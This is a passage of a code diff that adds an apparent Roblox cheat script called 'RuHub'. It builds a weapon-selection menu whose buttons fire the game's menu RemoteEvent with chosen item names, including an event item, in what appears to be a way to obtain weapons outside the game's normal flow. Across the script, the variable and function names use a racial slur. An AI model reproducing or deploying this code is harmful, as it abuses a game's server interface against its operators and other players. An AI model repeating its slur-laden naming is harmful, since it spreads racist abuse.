+IconShadow_2.Position = UDim2.new(0, 2, 0, 2)
+IconShadow_2.Size = UDim2.new(0, 100, 0, 100)
+IconShadow_2.Image = "http://www.roblox.com/asset/?id=6507111195"
+IconShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
+IconShadow_2.ImageTransparency = 0.500
+
+Icon_2.Name = "Icon"
+Icon_2.Parent = Chainsaw
+Icon_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon_2.BackgroundTransparency = 1.000
+Icon_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Icon_2.Size = UDim2.new(0, 100, 0, 100)
+Icon_2.Image = "http://www.roblox.com/asset/?id=6507111195"
+
+TextLabel_2.Parent = Chainsaw
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_2.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_2.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_2.Font = Enum.Font.SourceSansBold
+TextLabel_2.Text = "Chainsaw"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextSize = 17.000
+
+HolloweenDagger.Name = "Holloween Dagger"
+HolloweenDagger.Parent = ScrollingFrame
+HolloweenDagger.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+HolloweenDagger.BackgroundTransparency = 0.700
+HolloweenDagger.BorderColor3 = Color3.fromRGB(27, 42, 53)
+HolloweenDagger.LayoutOrder = -2
+HolloweenDagger.Size = UDim2.new(0, 100, 0, 100)
+HolloweenDagger.Image = "rbxassetid://94271152542865"
+HolloweenDagger.MouseButton1Down:Connect(function()
+	local args = { [1] = "Holloween Dagger" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+
+TextLabel_3.Parent = HolloweenDagger
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_3.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_3.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_3.Font = Enum.Font.SourceSansBold
+TextLabel_3.Text = "Holloween Dagger"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 17.000
+
+Icon_3.Name = "Icon"
+Icon_3.Parent = HolloweenDagger
+Icon_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon_3.BackgroundTransparency = 1.000
+Icon_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Icon_3.Size = UDim2.new(0, 100, 0, 100)
+Icon_3.Image = "rbxassetid://94271152542865"
+
+IconShadow_3.Name = "Icon Shadow"
+IconShadow_3.Parent = HolloweenDagger
+IconShadow_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IconShadow_3.BackgroundTransparency = 1.000
+IconShadow_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
+IconShadow_3.Position = UDim2.new(0, 2, 0, 2)
+IconShadow_3.Size = UDim2.new(0, 100, 0, 100)
+IconShadow_3.Image = "rbxassetid://94271152542865"
+IconShadow_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
+IconShadow_3.ImageTransparency = 0.500
+
+UICorner_3.CornerRadius = UDim.new(0, 4)
+UICorner_3.Parent = HolloweenDagger
+
+TextLabel_4.Parent = HolloweenDagger
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_4.Position = UDim2.new(0.239999995, 0, 0.0199999996, 0)
+TextLabel_4.Size = UDim2.new(0.75999999, 0, -0.0700000003, 20)
+TextLabel_4.Font = Enum.Font.SourceSansBold
+TextLabel_4.Text = "Event Item"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextSize = 17.000
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(138, 127, 255)), ColorSequenceKeypoint.new(0.13, Color3.fromRGB(179, 150, 255)), ColorSequenceKeypoint.new(0.18, Color3.fromRGB(159, 126, 255)), ColorSequenceKeypoint.new(0.41, Color3.fromRGB(169, 161, 255)), ColorSequenceKeypoint.new(0.57, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.86, Color3.fromRGB(141, 117, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient.Rotation = 90
+UIGradient.Parent = TextLabel_4
+
+Frame.Parent = HolloweenDagger
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0, 0, 0.360000014, 0)
+Frame.Size = UDim2.new(0, 100, 0, 64)
+
+UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(152, 153, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(152, 153, 255))}
+UIGradient_2.Rotation = 90
+UIGradient_2.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 1.00), NumberSequenceKeypoint.new(1.00, 0.41)}
+UIGradient_2.Parent = Frame
+
+UICorner_4.CornerRadius = UDim.new(0, 4)
+UICorner_4.Parent = Frame
+
+PinkHammer.Name = "Pink Hammer"
+PinkHammer.Parent = ScrollingFrame
+PinkHammer.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+PinkHammer.BackgroundTransparency = 0.700
+PinkHammer.BorderColor3 = Color3.fromRGB(27, 42, 53)
+PinkHammer.LayoutOrder = -1
+PinkHammer.Size = UDim2.new(0, 100, 0, 100)
+PinkHammer.Image = "rbxassetid://17023294052"
+PinkHammer.MouseButton1Down:Connect(function()
+	local args = { [1] = "Pink Hammer" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+TextLabel_5.Parent = PinkHammer
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_5.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_5.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_5.Font = Enum.Font.SourceSansBold
+TextLabel_5.Text = "Pink Hammer"
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextSize = 17.000
+
+UICorner_5.CornerRadius = UDim.new(0, 4)
+UICorner_5.Parent = PinkHammer
+
+SteelSword.Name = "Steel Sword"
+SteelSword.Parent = ScrollingFrame
+SteelSword.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+SteelSword.BackgroundTransparency = 0.700
+SteelSword.BorderColor3 = Color3.fromRGB(27, 42, 53)
+SteelSword.LayoutOrder = -1
+SteelSword.Size = UDim2.new(0, 100, 0, 100)
+SteelSword.Image = "rbxassetid://17013589485"
+SteelSword.MouseButton1Down:Connect(function()
+	local args = { [1] = "Steel Sword" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+
+TextLabel_6.Parent = SteelSword
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BackgroundTransparency = 1.000
+TextLabel_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_6.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_6.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_6.Font = Enum.Font.SourceSansBold
+TextLabel_6.Text = "Steel Sword"
+TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.TextSize = 17.000
+
+UICorner_6.CornerRadius = UDim.new(0, 4)
+UICorner_6.Parent = SteelSword
+
+Katana.Name = "Katana"
+Katana.Parent = ScrollingFrame
+Katana.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Katana.BackgroundTransparency = 0.700
+Katana.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Katana.LayoutOrder = -1
+Katana.Size = UDim2.new(0, 100, 0, 100)
+Katana.Image = "rbxassetid://16798162370"
+Katana.MouseButton1Down:Connect(function()
+
+	local args = { [1] = "Katana" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+	
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+TextLabel_7.Parent = Katana
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.BackgroundTransparency = 1.000
+TextLabel_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_7.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_7.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_7.Font = Enum.Font.SourceSansBold
+TextLabel_7.Text = "Katana"
+TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.TextSize = 17.000
+
+UICorner_7.CornerRadius = UDim.new(0, 4)
+UICorner_7.Parent = Katana
+
+FrostSpear.Name = "Frost Spear"
+FrostSpear.Parent = ScrollingFrame
+FrostSpear.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+FrostSpear.BackgroundTransparency = 0.700
+FrostSpear.BorderColor3 = Color3.fromRGB(27, 42, 53)
+FrostSpear.Size = UDim2.new(0, 100, 0, 100)
+FrostSpear.MouseButton1Down:Connect(function()
+	local args = { [1] = "Frost Spear" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+ViewportFrame.BackgroundTransparency = 1.000
+ViewportFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ViewportFrame.BorderSizePixel = 0
+ViewportFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ViewportFrame.Parent = FrostSpear
+
+TextLabel_8.Parent = FrostSpear
+TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_8.BackgroundTransparency = 1.000
+TextLabel_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_8.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_8.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_8.Font = Enum.Font.SourceSansBold
+TextLabel_8.Text = "Frost Spear"
+TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_8.TextSize = 17.000
+
+UICorner_8.CornerRadius = UDim.new(0, 4)
+UICorner_8.Parent = FrostSpear
+
+BloodDagger.Name = "Blood Dagger"
+BloodDagger.Parent = ScrollingFrame
+BloodDagger.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+BloodDagger.BackgroundTransparency = 0.700
+BloodDagger.BorderColor3 = Color3.fromRGB(27, 42, 53)
+BloodDagger.Size = UDim2.new(0, 100, 0, 100)
+BloodDagger.Image = "http://www.roblox.com/asset/?id=6568544215"
+BloodDagger.MouseButton1Down:Connect(function()
+	local args = { [1] = "Blood Dagger" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+TextLabel_9.Parent = BloodDagger
+TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_9.BackgroundTransparency = 1.000
+TextLabel_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_9.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_9.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_9.Font = Enum.Font.SourceSansBold
+TextLabel_9.Text = "Blood Dagger"
+TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_9.TextSize = 17.000
+
+Icon_4.Name = "Icon"
+Icon_4.Parent = BloodDagger
+Icon_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon_4.BackgroundTransparency = 1.000
+Icon_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Icon_4.Size = UDim2.new(0, 100, 0, 100)
+Icon_4.Image = "http://www.roblox.com/asset/?id=6568544215"
+
+IconShadow_4.Name = "Icon Shadow"
+IconShadow_4.Parent = BloodDagger
+IconShadow_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IconShadow_4.BackgroundTransparency = 1.000
+IconShadow_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
+IconShadow_4.Position = UDim2.new(0, 2, 0, 2)
+IconShadow_4.Size = UDim2.new(0, 100, 0, 100)
+IconShadow_4.Image = "http://www.roblox.com/asset/?id=6568544215"
+IconShadow_4.ImageColor3 = Color3.fromRGB(0, 0, 0)
+IconShadow_4.ImageTransparency = 0.500
+
+UICorner_9.CornerRadius = UDim.new(0, 4)
+UICorner_9.Parent = BloodDagger
+
+EmeraldGreatsword.Name = "Emerald Greatsword"
+EmeraldGreatsword.Parent = ScrollingFrame
+EmeraldGreatsword.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+EmeraldGreatsword.BackgroundTransparency = 0.700
+EmeraldGreatsword.BorderColor3 = Color3.fromRGB(27, 42, 53)
+EmeraldGreatsword.Size = UDim2.new(0, 100, 0, 100)
+EmeraldGreatsword.Image = "http://www.roblox.com/asset/?id=6507137591"
+EmeraldGreatsword.MouseButton1Down:Connect(function()
+	local args = { [1] = "Emerald Greatsword" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+TextLabel_10.Parent = EmeraldGreatsword
+TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_10.BackgroundTransparency = 1.000
+TextLabel_10.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_10.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_10.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_10.Font = Enum.Font.SourceSansBold
+TextLabel_10.Text = "Emerald Greasword"
+TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_10.TextSize = 17.000
+
+Icon_5.Name = "Icon"
+Icon_5.Parent = EmeraldGreatsword
+Icon_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon_5.BackgroundTransparency = 1.000
+Icon_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Icon_5.Size = UDim2.new(0, 100, 0, 100)
+Icon_5.Image = "http://www.roblox.com/asset/?id=6507137591"
+
+IconShadow_5.Name = "Icon Shadow"
+IconShadow_5.Parent = EmeraldGreatsword
+IconShadow_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IconShadow_5.BackgroundTransparency = 1.000
+IconShadow_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
+IconShadow_5.Position = UDim2.new(0, 2, 0, 2)
+IconShadow_5.Size = UDim2.new(0, 100, 0, 100)
+IconShadow_5.Image = "http://www.roblox.com/asset/?id=6507137591"
+IconShadow_5.ImageColor3 = Color3.fromRGB(0, 0, 0)
+IconShadow_5.ImageTransparency = 0.500
+
+UICorner_10.CornerRadius = UDim.new(0, 4)
+UICorner_10.Parent = EmeraldGreatsword
+
+Scythe.Name = "Scythe"
+Scythe.Parent = ScrollingFrame
+Scythe.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Scythe.BackgroundTransparency = 0.700
+Scythe.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Scythe.Size = UDim2.new(0, 100, 0, 100)
+Scythe.Image = "http://www.roblox.com/asset/?id=6515406928"
+Scythe.MouseButton1Down:Connect(function()
+	local args = { [1] = "Scythe" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+TextLabel_11.Parent = Scythe
+TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_11.BackgroundTransparency = 1.000
+TextLabel_11.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_11.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_11.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_11.Font = Enum.Font.SourceSansBold
+TextLabel_11.Text = "Scythe"
+TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_11.TextSize = 17.000
+
+Icon_6.Name = "Icon"
+Icon_6.Parent = Scythe
+Icon_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon_6.BackgroundTransparency = 1.000
+Icon_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Icon_6.Size = UDim2.new(0, 100, 0, 100)
+Icon_6.Image = "http://www.roblox.com/asset/?id=6515406928"
+
+IconShadow_6.Name = "Icon Shadow"
+IconShadow_6.Parent = Scythe
+IconShadow_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IconShadow_6.BackgroundTransparency = 1.000
+IconShadow_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
+IconShadow_6.Position = UDim2.new(0, 2, 0, 2)
+IconShadow_6.Size = UDim2.new(0, 100, 0, 100)
+IconShadow_6.Image = "http://www.roblox.com/asset/?id=6515406928"
+IconShadow_6.ImageColor3 = Color3.fromRGB(0, 0, 0)
+IconShadow_6.ImageTransparency = 0.500
+
+UICorner_11.CornerRadius = UDim.new(0, 4)
+UICorner_11.Parent = Scythe
+
+UIPadding.Parent = ScrollingFrame
+UIPadding.PaddingBottom = UDim.new(0, 5)
+UIPadding.PaddingTop = UDim.new(0, 5)
+
+UIGridLayout.Parent = ScrollingFrame
+UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout.CellPadding = UDim2.new(0, 5, 0, 20)
+
+BaseballBat.Name = "Baseball Bat"
+BaseballBat.Parent = ScrollingFrame
+BaseballBat.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+BaseballBat.BackgroundTransparency = 0.700
+BaseballBat.BorderColor3 = Color3.fromRGB(27, 42, 53)
+BaseballBat.LayoutOrder = -1
+BaseballBat.Size = UDim2.new(0, 100, 0, 100)
+BaseballBat.Image = "http://www.roblox.com/asset/?id=6507085332"
+BaseballBat.MouseButton1Down:Connect(function()
+	local args = { [1] = "Baseball Bat" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+TextLabel_12.Parent = BaseballBat
+TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_12.BackgroundTransparency = 1.000
+TextLabel_12.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_12.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_12.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_12.Font = Enum.Font.SourceSansBold
+TextLabel_12.Text = "Baseball Bat"
+TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_12.TextSize = 17.000
+
+Icon_7.Name = "Icon"
+Icon_7.Parent = BaseballBat
+Icon_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon_7.BackgroundTransparency = 1.000
+Icon_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Icon_7.Size = UDim2.new(0, 100, 0, 100)
+Icon_7.Image = "http://www.roblox.com/asset/?id=6507085332"
+
+IconShadow_7.Name = "Icon Shadow"
+IconShadow_7.Parent = BaseballBat
+IconShadow_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IconShadow_7.BackgroundTransparency = 1.000
+IconShadow_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
+IconShadow_7.Position = UDim2.new(0, 2, 0, 2)
+IconShadow_7.Size = UDim2.new(0, 100, 0, 100)
+IconShadow_7.Image = "http://www.roblox.com/asset/?id=6507085332"
+IconShadow_7.ImageColor3 = Color3.fromRGB(0, 0, 0)
+IconShadow_7.ImageTransparency = 0.500
+
+UICorner_12.CornerRadius = UDim.new(0, 4)
+UICorner_12.Parent = BaseballBat
+
+Pencil.Name = "Pencil"
+Pencil.Parent = ScrollingFrame
+Pencil.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Pencil.BackgroundTransparency = 0.700
+Pencil.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Pencil.Size = UDim2.new(0, 100, 0, 100)
+Pencil.Image = "http://www.roblox.com/asset/?id=6507133906"
+Pencil.MouseButton1Down:Connect(function()
+	local args = { [1] = "Pencil" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+TextLabel_13.Parent = Pencil
+TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_13.BackgroundTransparency = 1.000
+TextLabel_13.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_13.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_13.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_13.Font = Enum.Font.SourceSansBold
+TextLabel_13.Text = "Pencil"
+TextLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_13.TextSize = 17.000
+
+Icon_8.Name = "Icon"
+Icon_8.Parent = Pencil
+Icon_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon_8.BackgroundTransparency = 1.000
+Icon_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Icon_8.Size = UDim2.new(0, 100, 0, 100)
+Icon_8.Image = "http://www.roblox.com/asset/?id=6507133906"
+
+IconShadow_8.Name = "Icon Shadow"
+IconShadow_8.Parent = Pencil
+IconShadow_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IconShadow_8.BackgroundTransparency = 1.000
+IconShadow_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
+IconShadow_8.Position = UDim2.new(0, 2, 0, 2)
+IconShadow_8.Size = UDim2.new(0, 100, 0, 100)
+IconShadow_8.Image = "http://www.roblox.com/asset/?id=6507133906"
+IconShadow_8.ImageColor3 = Color3.fromRGB(0, 0, 0)
+IconShadow_8.ImageTransparency = 0.500
+
+UICorner_13.CornerRadius = UDim.new(0, 4)
+UICorner_13.Parent = Pencil
+
+Pan.Name = "Pan"
+Pan.Parent = ScrollingFrame
+Pan.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Pan.BackgroundTransparency = 0.700
+Pan.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Pan.Size = UDim2.new(0, 100, 0, 100)
+Pan.Image = "http://www.roblox.com/asset/?id=6507124807"
+Pan.MouseButton1Down:Connect(function()
+	local args = { [1] = "Pan" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+TextLabel_14.Parent = Pan
+TextLabel_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_14.BackgroundTransparency = 1.000
+TextLabel_14.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_14.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_14.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_14.Font = Enum.Font.SourceSansBold
+TextLabel_14.Text = "Pan"
+TextLabel_14.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_14.TextSize = 17.000
+
+Icon_9.Name = "Icon"
+Icon_9.Parent = Pan
+Icon_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon_9.BackgroundTransparency = 1.000
+Icon_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Icon_9.Size = UDim2.new(0, 100, 0, 100)
+Icon_9.Image = "http://www.roblox.com/asset/?id=6507124807"
+
+IconShadow_9.Name = "Icon Shadow"
+IconShadow_9.Parent = Pan
+IconShadow_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IconShadow_9.BackgroundTransparency = 1.000
+IconShadow_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
+IconShadow_9.Position = UDim2.new(0, 2, 0, 2)
+IconShadow_9.Size = UDim2.new(0, 100, 0, 100)
+IconShadow_9.Image = "http://www.roblox.com/asset/?id=6507124807"
+IconShadow_9.ImageColor3 = Color3.fromRGB(0, 0, 0)
+IconShadow_9.ImageTransparency = 0.500
+
+UICorner_14.CornerRadius = UDim.new(0, 4)
+UICorner_14.Parent = Pan
+
+Knife.Name = "Knife"
+Knife.Parent = ScrollingFrame
+Knife.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Knife.BackgroundTransparency = 0.700
+Knife.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Knife.Size = UDim2.new(0, 100, 0, 100)
+Knife.Image = "http://www.roblox.com/asset/?id=6507114306"
+Knife.MouseButton1Down:Connect(function()
+	local args = { [1] = "Knife" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+TextLabel_15.Parent = Knife
+TextLabel_15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_15.BackgroundTransparency = 1.000
+TextLabel_15.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_15.Position = UDim2.new(0, 0, 1, 0)
+TextLabel_15.Size = UDim2.new(1, 0, 0, 20)
+TextLabel_15.Font = Enum.Font.SourceSansBold
+TextLabel_15.Text = "Knife"
+TextLabel_15.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_15.TextSize = 17.000
+
+Icon_10.Name = "Icon"
+Icon_10.Parent = Knife
+Icon_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon_10.BackgroundTransparency = 1.000
+Icon_10.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Icon_10.Size = UDim2.new(0, 100, 0, 100)
+Icon_10.Image = "http://www.roblox.com/asset/?id=6507114306"
+
+IconShadow_10.Name = "Icon Shadow"
+IconShadow_10.Parent = Knife
+IconShadow_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IconShadow_10.BackgroundTransparency = 1.000
+IconShadow_10.BorderColor3 = Color3.fromRGB(27, 42, 53)
+IconShadow_10.Position = UDim2.new(0, 2, 0, 2)
+IconShadow_10.Size = UDim2.new(0, 100, 0, 100)
+IconShadow_10.Image = "http://www.roblox.com/asset/?id=6507114306"
+IconShadow_10.ImageColor3 = Color3.fromRGB(0, 0, 0)
+IconShadow_10.ImageTransparency = 0.500
+
+UICorner_15.CornerRadius = UDim.new(0, 4)
+UICorner_15.Parent = Knife
+
+TextLabel_16.Parent = niggamenuframe
+TextLabel_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_16.BackgroundTransparency = 1.000
+TextLabel_16.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_16.Position = UDim2.new(0, 0, 0, -40)
+TextLabel_16.Size = UDim2.new(1, 0, 0, 30)
+TextLabel_16.Font = Enum.Font.SourceSansBold
+TextLabel_16.Text = "RuHub is the best fucking Script Hub ever Made >:)"
+TextLabel_16.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_16.TextSize = 25.000
+
+ImageLabel.Parent = niggamenuframe
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
+ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=6507163676"
+ImageLabel.ImageColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.ImageTransparency = 0.500
+ImageLabel.ScaleType = Enum.ScaleType.Slice
+ImageLabel.SliceCenter = Rect.new(12, 12, 12, 12)
+
+end
+
+player.CharacterAdded:Connect(nigga2)
+player.CharacterAdded:Connect(nigga1)
